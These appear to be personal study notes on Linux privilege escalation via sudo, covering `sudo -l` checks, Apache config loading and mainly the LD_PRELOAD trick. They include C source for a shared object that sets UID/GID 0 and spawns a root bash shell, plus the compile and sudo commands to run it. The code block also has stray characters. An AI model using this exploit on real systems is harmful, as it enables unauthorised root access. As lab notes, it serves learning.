
`sudo -l` shows all of the commands that run as sudo (your users)

# Apache2 server
run a command + `-h` to read about it 
`apache -f` we can load an alternative config file
# LD_PRELOAD
if we run `sudo -l` we need to check if *env_keep+=LD_PRELOAD*
it allows anyprogrram to use shared library. that will be loaded nad executed before the program is run. 
	remember here REAL USER ID = EFFECTIVE USER ID
1. write a simple c code complied as a shared obj file (.so extension)
2. run the program with sudo privilages and LD_PRELOAD option pointing to our .so file
	`#include <stdio.h> 
	`#include <sys/types.h> 
	`#include <unistd.h>`
	`#include <stdlib.h> 
	`void _init() { M
	`unsetenv("LD_PRELOAD"); 
G	`setgid(0);
	` setuid(0); system("/bin/bash"); 
	`}`
	Complie it using gcc
3. `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` after this you can run
4. `sudo LD_PRELOAD=/home/user/ldpreload/shell.so command_name`
	here we should note the `LD_PRELOAD=...` this line should contain the real path of the .so file
	and command should be a command with setuid bit 

> also note that a normal c code will throw an error if we refer to smt withotu defining it first we add the follwoing to our code 
> #include <unistd.h>
> #include <stdlib.h>